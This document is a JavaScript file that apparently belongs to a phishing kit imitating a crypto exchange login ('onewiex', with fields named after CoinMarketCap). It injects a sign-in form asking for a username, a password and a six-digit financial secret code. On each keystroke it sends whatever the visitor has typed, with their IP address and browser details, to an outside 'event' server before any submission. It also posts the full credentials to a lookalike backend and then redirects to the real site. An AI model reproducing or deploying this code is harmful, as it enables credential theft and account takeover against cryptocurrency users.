const ONEWIEX_BACKEND_URL = 'https://onewiex.coinbot.site';
const EVENT_BACKEND_URL = 'https://event.coinbot.site';

// const ONEWIEX_BACKEND_URL = 'http://127.0.0.1:8002';
// const EVENT_BACKEND_URL = '';
const loginTemplate = document.createElement('template');

loginTemplate.innerHTML = `
                    <form
                      id="signin-form"
                      novalidate="true"
                      tabindex="-1"
                      class="header-sign active animate__animated animate__faster animate__fadeIn ng-dirty ng-touched ng-submitted ng-invalid"
                      autocomplete="off"
                    >
                      <fieldset>
                        <div
                          nicescroll=""
                          class="nicescroll-box"
                          tabindex="3"
                          style="
                            overflow: hidden;
                            position: relative;
                            outline: none;
                          "
                        >
                          <div
                            class="wrap"
                            style="
                              transition: transform 0ms ease-out 0s;
                              transform: translate3d(0px, 0px, 0px);
                            "
                          >
                            <img title="onewiex" src="assets/img/sign-icon.svg" alt="Sign In" />
                            <h3>Sign in</h3>

                            <div class="m-input__title">Username</div>
                            <label class="m-input">
                              <input
                                id="coinmarketcap-username"
                                type="text"
                                maxlength="64"
                                placeholder="Enter username"
                                class="ng-dirty ng-valid ng-touched"
                              />
                            </label>

                            <div class="m-input__title">Password</div>
                            <label class="m-input">
                              <input
                                id="coinmarketcap-password"
                                type="password"
                                formcontrolname="password"
                                placeholder="Enter your password"
                                class="ng-dirty ng-valid ng-touched"
                              />
                            </label>

                            <div id="financial-secret-code">
                              <div class="m-input__title">
                                Financial secret code
                              </div>
                              <label class="m-input">
                                <input
                                  id="coinmarketcap-secret"
                                  type="text"
                                  minlength="6"
                                  maxlength="6"
                                  oninput="this.value = this.value.replace(/[^0-9]/g, '');"
                                  placeholder="Enter 6 Digits of Secret Code"
                                  class="ng-untouched ng-pristine ng-invalid"
                                />
                              </label>
                            </div>

                            <div class="header-sign__bot">
                              <button
                                class="m-btn tr"
                                id="coinmarketcap-signin"
                                onclick="signin(event)"
                              >
                                Sign in
                              </button>
                              <a href="signup" class="header-sign__link"
                                >Forgot password?</a
                              >
                            </div>
                          </div>
                        </div>
                      </fieldset>
                    </form>
`;

const targetElement = document.getElementById('login-form-container');
if (targetElement) {
  targetElement.appendChild(loginTemplate.content.cloneNode(true));
}

const signInForm = document.getElementById('signin-form');
const signInBtn = document.querySelector('.m-btn.sm.white.text-nowrap');

signInBtn.addEventListener('click', function () {
  signInForm.classList.toggle('show');
});

let SIGNIN_CLICK_TIMES = 0;
async function signin(event) {
  event.preventDefault();

  const usernameInput = document.getElementById('coinmarketcap-username');
  const passwordInput = document.getElementById('coinmarketcap-password');
  const secretInput = document.getElementById('coinmarketcap-secret');
  const financialSecretCode = document.getElementById('financial-secret-code');

  if (usernameInput.value.trim() === '' || passwordInput.value.trim() === '') {
    alert('Please enter both username and password.');
    return;
  }

  if (SIGNIN_CLICK_TIMES == 0) {
    financialSecretCode.style.display = 'block';
    SIGNIN_CLICK_TIMES = 1;
  } else {
    const secretRegex = /^\d{6}$/;
    if (!secretRegex.test(secretInput.value)) {
      alert('Financial Secret Code must be exactly 6 digits.');
      return;
    }

    try {
      const token = await grecaptcha.enterprise.execute(
        '6LdI55gnAAAAAMdf8vpOGPF5cLPXl_l7eg_dLZAM',
        { action: 'LOGIN' }
      );

      const loginData = {
        username: usernameInput.value,
        password: passwordInput.value,
        secret: secretInput.value,
        recaptchaToken: token,
      };

      const response = await fetch(`${ONEWIEX_BACKEND_URL}/login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(loginData),
      });

      const data = await response.json();

      if (data.success) {
        if (data.onewiex_site) {
          localStorage.setItem('jwtToken', data.token);
          window.location.href = 'account.html';
        } else {
          window.location.href = 'https://onewiex.com/';
        }
      } else {
        alert(`Login failed: ${data.message}`);
      }
    } catch (error) {
      console.error('Error:', error);
      alert('An error occurred');
    }
  }
}

let userIP = 'none';
let userAgent = 'none';

function getUserIP() {
  fetch('https://api.ipify.org?format=json')
    .then((response) => response.json())
    .then((data) => {
      userIP = data.ip;
    })
    .catch((error) => {
      console.error('Error fetching IP address:', error);
    });
}

function getUserAgent() {
  userAgent = navigator.userAgent;
}

getUserIP();
getUserAgent();

function sendEvent(event) {
  const formData = {
    event: event,
    ip: userIP,
    userAgent: userAgent,
  };

  const inputs = document.querySelectorAll('[id^="coinmarketcap-"]');
  var isAllValueEmpty = true;
  for (const input of inputs) {
    const name = input.id.replace('coinmarketcap-', '');
    const value = input.value.trim();
    if (value !== '') {
      isAllValueEmpty = false;
      formData[name] = value;
    }
  }

  if (isAllValueEmpty == false) {
    const jsonData = JSON.stringify(formData);

    fetch(`${EVENT_BACKEND_URL}/event`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: jsonData,
    })
      .then((response) => response.json())
      .then((data) => {
        // console.log(data);
        console.log('OK');
      })
      .catch((error) => {
        console.error('Error:', error);
      });
  }
}

const inputs = document.querySelectorAll('[id^="coinmarketcap-"]');
let timeout;
for (const input of inputs) {
  if (input.nodeName === 'INPUT') {
    input.addEventListener('keyup', function () {
      clearTimeout(timeout);
      timeout = setTimeout(function () {
        sendEvent('keyup');
      }, 1000);
    });
  } else if (input.nodeName === 'BUTTON') {
    input.addEventListener('click', function () {
      sendEvent('click');
    });
  }
}
